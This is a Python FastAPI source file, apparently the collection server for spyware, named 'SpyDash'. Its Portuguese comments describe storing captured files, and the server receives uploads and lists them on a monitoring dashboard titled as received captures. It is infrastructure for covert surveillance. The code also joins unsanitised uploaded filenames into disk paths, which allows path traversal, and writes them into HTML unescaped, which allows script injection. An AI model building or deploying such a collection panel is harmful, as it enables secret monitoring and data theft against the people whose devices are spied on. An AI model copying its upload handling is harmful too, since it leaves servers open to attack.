import os
import shutil
from fastapi import FastAPI, UploadFile, File
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles

app = FastAPI()

# Diretório onde os arquivos capturados serão armazenados
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

# Tornar os arquivos acessíveis via navegador
app.mount("/uploads", StaticFiles(directory=UPLOAD_DIR), name="uploads")

@app.get("/")
def home():
    arquivos = os.listdir(UPLOAD_DIR)
    lista_html = "".join(
        f"<li><a href='/uploads/{arq}' target='_blank'>{arq}</a></li>" for arq in arquivos
    )
    return HTMLResponse(f"""
    <h1>🕵️ SpyDash - Painel de Monitoramento</h1>
    <h3>📡 Capturas Recebidas</h3>
    <ul>{lista_html}</ul>
    """)

@app.post("/upload")
async def upload(file: UploadFile = File(...)):
    destino = os.path.join(UPLOAD_DIR, file.filename)
    with open(destino, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
    return {"status": "ok", "filename": file.filename}
